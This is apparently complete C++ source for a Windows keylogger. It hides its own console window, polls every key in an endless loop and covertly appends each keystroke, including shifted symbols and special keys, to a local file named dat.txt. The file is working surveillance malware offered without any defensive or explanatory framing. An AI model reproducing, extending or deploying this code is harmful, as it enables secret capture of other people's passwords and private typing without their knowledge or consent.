#define _WIN32_WINNT 0x0500
#include <Windows.h>
#include <string>
#include <stdlib.h>
#include <stdio.h>
#include <iostream>
#include <fstream>



using namespace std;

bool shiftPressed = false;

void LOG(string input) {
	fstream LogFile;
	LogFile.open("dat.txt", fstream::app);
	if (LogFile.is_open()) {
		LogFile << input;
		LogFile.close();
	}
}


bool SpecialKeys(int S_Key) {
	char* keyz = ")!@#$%^&*(";
	char* numz = "0123456789";
	char* fz = "123456789abc";
	char c = 'x';
	string emptStr = "";
	switch (S_Key) {
	case 48:case 49:case 50:case 51:case 52:case 53:case 54:case 55:case 56:case 57:
		if (shiftPressed) {
			c = keyz[S_Key - 48];
			emptStr += c;
			cout << emptStr;
			LOG(emptStr);
		}
		else {
			return false;
		}
		return true;
	case 96:case 97:case 98:case 99:case 100:case 101:case 102:case 103:case 104:case 105:
		c = numz[S_Key - 96];
		emptStr += c;
		cout << emptStr;
		LOG(emptStr);
		return true;
	case 112:case 113:case 114:case 115:case 116:case 117:case 118:case 119:case 120:case 121:case 122:case 123:
		c = fz[S_Key - 112];
		if (c == 'a') {
			emptStr += "[F10]";
		}
		else if (c == 'b') {
			emptStr += "[F11]";
		}
		else if (c == 'c') {
			emptStr += "[F12]";
		}
		else {
			emptStr += "[F";
			emptStr += c;
			emptStr += "]";
		}
		cout << emptStr;
		LOG(emptStr);
		return true;
	case VK_INSERT:
		cout << "[INSERT]";
		LOG("[INSERT]");
		return true;
	case VK_HOME:
		cout << "[HOME]";
		LOG("[HOME]");
		return true;
	case VK_END:
		cout << "[END]";
		LOG("[END]");
		return true;
	case VK_DELETE:
		cout << "[DELETE]";
		LOG("[DELETE]");
		return true;
	case 34:
		cout << "[PGDN]";
		LOG("[PGDN]");
		return true;
	case 33:
		cout << "[PGUP]";
		LOG("[PGUP]");
		return true;
	case VK_SPACE:
		cout << " ";
		LOG(" ");
		return true;
	case VK_RETURN:case 83:
		cout << "\n";
		LOG("\n");
		return true;
	case VK_SHIFT:
		cout << "[SHIFT]";
		LOG("[SHIFT]");
		shiftPressed = true;
		return true;
	case VK_CONTROL:
		cout << "[CONTROL]";
		LOG("[CONTROL]");
		return true;
	case 18: // ALT
		cout << "[ALT]";
		LOG("[ALT]");
		return true;
	case VK_TAB:
		cout << "[TAB]";
		LOG("[TAB]");
		return true;
	case VK_BACK:
		cout << "\b";
		LOG("\b");
		return true;
	case VK_UP:
		cout << "[UP]";
		LOG("[UP]");
		return true;
	case VK_LEFT:
		cout << "[LEFT]";
		LOG("[LEFT]");
		return true;
	case VK_RIGHT:
		cout << "[RIGHT]";
		LOG("[RIGHT]");
		return true;
	case VK_DOWN:
		cout << "[DOWN]";
		LOG("[DOWN]");
		return true;
	case 188:
		if (shiftPressed) {
			cout << "<";
			LOG("<");
		}else{
			cout << ",";
			LOG(",");
		}
		return true;
	case 190:case 110:
		if (shiftPressed && S_Key != 110) {
			cout << ">";
			LOG(">");
		}
		else {
			cout << ".";
			LOG(".");
		}
		return true;
	case 191:case 111:
		if (shiftPressed && S_Key != 111) {
			cout << "?";
			LOG("?");
		}
		else {
			cout << "/";
			LOG("/");
		}
		return true;
	case 106:
		cout << "*";
		LOG("*");
		return true;
	case 219:
		if (shiftPressed) {
			cout << "{";
			LOG("{");
		}
		else {
			cout << "[";
			LOG("[");
		}
		return true;
	case 221:
		if (shiftPressed) {
			cout << "}";
			LOG("}");
		}
		else {
			cout << "]";
			LOG("]");
		}
		return true;
	case 186:
		if (shiftPressed) {
			cout << ":";
			LOG(":");
		}
		else {
			cout << ";";
			LOG(";");
		}
		return true;
	case 222:
		if (shiftPressed) {
			cout << "\"";
			LOG("\"");
		}
		else {
			cout << "'";
			LOG("'");
		}
		return true;
	case 220:case 226:
		if (shiftPressed) {
			cout << "|";
			LOG("|");
		}
		else {
			cout << "\\";
			LOG("\\");
		}
		return true;
	case 192:
		if (shiftPressed) {
			cout << "~";
			LOG("~");
		}
		else {
			cout << "`";
			LOG("`");
		}
		return true;
	case 189:case 109:
		if (shiftPressed && S_Key != 109) {
			cout << "_";
			LOG("_");
		}
		else {
			cout << "-";
			LOG("-");
		}
		return true;
	case 187:case 107:
		if (shiftPressed && S_Key != 107) {
			cout << "+";
			LOG("+");
		}
		else {
			cout << "=";
			LOG("=");
		}
		return true;
	case 20:
		cout << "[CAPSLOCK]";
		LOG("[CAPSLOCK]");
		return true;
	case 91:case 92:
		cout << "[WINDOWS]";
		LOG("[WINDOWS]");
		return true;
	case 93:
		cout << "[OPTIONS]";
		LOG("[OPTIONS]");
		return true;
	case VK_NUMLOCK:
		cout << "[NUMLOCK]";
		LOG("[NUMLOCK]");
		return true;
	default:
		return false;
	}
}



int main()
{
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	char KEY = 'x';

	while (true) {
		Sleep(10);
		for (int KEY = 8; KEY <= 255; KEY++)
		{
			if (KEY == 160 || KEY == 161 || KEY == 162 || KEY == 163 || KEY == 164 || KEY == 165) continue;
			if (shiftPressed && GetAsyncKeyState(VK_SHIFT) == 0) {
				shiftPressed = false;
				fstream LogFile;
				LogFile.open("dat.txt", fstream::app);
				if (LogFile.is_open()) {
					LogFile << "[!SHIFT]";
					LogFile.close();
				}
			}
			if (GetAsyncKeyState(KEY) == -32767) {
				if (SpecialKeys(KEY) == false) {
					fstream LogFile;
					LogFile.open("dat.txt", fstream::app);
					if (LogFile.is_open()) {
						LogFile << '{';
						LogFile << KEY;
						LogFile << '}';
						LogFile << char(KEY);
						LogFile.close();
					}

				}
			}
		}
	}

	return 0;
}